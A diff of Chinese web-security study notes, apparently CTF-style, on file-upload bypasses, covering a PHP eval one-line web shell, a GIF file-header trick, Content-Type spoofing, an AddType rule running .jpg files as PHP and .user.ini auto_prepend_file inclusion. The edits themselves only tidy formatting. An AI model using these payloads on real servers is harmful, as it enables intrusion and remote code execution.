@@ -226,26 +226,18 @@ text=data://text/plain;base64，base64后的字符串
 
 ```
 <?php @eval($_POST['ac']); ?>
-
 ```
-
-
-
-
 
 ##### 图片绕过
 
-1。
+1.
 
 ```
 gif文件头
 GIF98a
-
 ```
 
 2.改Content-Type
-
-
 
 
 
@@ -270,11 +262,7 @@ AddType application/x-httpd-php .jpg
 
 `.user.ini`使用范围很广，不仅限于 Apache 服务器，同样适用于 [Nginx](https://so.csdn.net/so/search?q=Nginx&spm=1001.2101.3001.7020) 服务器，只要服务器启用了 fastcgi 模式 (通常非线程安全模式使用的就是 fastcgi 模式)。
 
-
-
 https://blog.csdn.net/cosmoslin/article/details/120793126
-
-
 
 需要.user.ini所在目录存在php文件
 
@@ -284,8 +272,6 @@ https://blog.csdn.net/cosmoslin/article/details/120793126
 auto_prepend_file = <filename>         //包含在文件头
 auto_append_file = <filename>          //包含在文件尾
 ```
-
-
 
 
 
